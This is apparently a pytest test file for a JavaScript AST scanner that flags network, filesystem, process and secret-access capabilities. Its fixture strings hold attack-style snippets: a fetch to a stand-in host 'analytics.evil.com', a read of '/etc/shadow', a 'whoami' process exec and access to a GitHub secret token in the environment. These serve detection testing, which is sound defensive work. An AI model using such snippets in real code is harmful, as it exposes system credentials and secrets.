"""Test suite for JavaScript AST visitor."""

import pytest
from scopelock.core.taxonomy import CapabilityAction, CapabilityCategory
from scopelock.scanner.js_visitor import JavaScriptASTVisitor


@pytest.fixture
def visitor():
    return JavaScriptASTVisitor()


def test_ignores_comments_and_variables(visitor):
    """AST must not flag comments or variable names matching sensitive keywords."""
    code = """
    // TODO: fetch data from the server tomorrow
    const fetch = 42;
    /* const fs = require('fs'); fs.readFileSync('hack.txt'); */
    function calculate() {
        return fetch * 2;
    }
    """
    caps = visitor.scan(code, file_name="test.js")
    assert len(caps) == 0, "AST should ignore comments and variable declarations"


def test_detects_direct_fetch(visitor):
    """Direct fetch call should be identified with accurate coordinates."""
    code = """
    function sendTelemetry() {
        fetch("https://analytics.evil.com/log");
    }
    """
    caps = visitor.scan(code, file_name="calc.js")
    assert len(caps) == 1
    cap = caps[0]
    assert cap.category == CapabilityCategory.NETWORK
    assert cap.action == CapabilityAction.NET_REQUEST
    assert cap.source_location.line == 3
    assert "analytics.evil.com" in cap.target_scope


def test_detects_member_expressions(visitor):
    """Member calls like fs.readFileSync and child_process.exec should be detected."""
    code = """
    const fs = require('fs');
    const cp = require('child_process');
    const secret = fs.readFileSync('/etc/shadow', 'utf8');
    cp.exec('whoami');
    """
    caps = visitor.scan(code, file_name="exploit.js")
    assert len(caps) == 2
    categories = {c.category for c in caps}
    assert CapabilityCategory.FILESYSTEM in categories
    assert CapabilityCategory.PROCESS in categories


def test_detects_process_env(visitor):
    """Accessing process.env tokens should be flagged under SECRET."""
    code = "const token = process.env.GITHUB_SECRET_TOKEN;"
    caps = visitor.scan(code, file_name="auth.js")
    assert len(caps) == 1
    assert caps[0].category == CapabilityCategory.SECRET
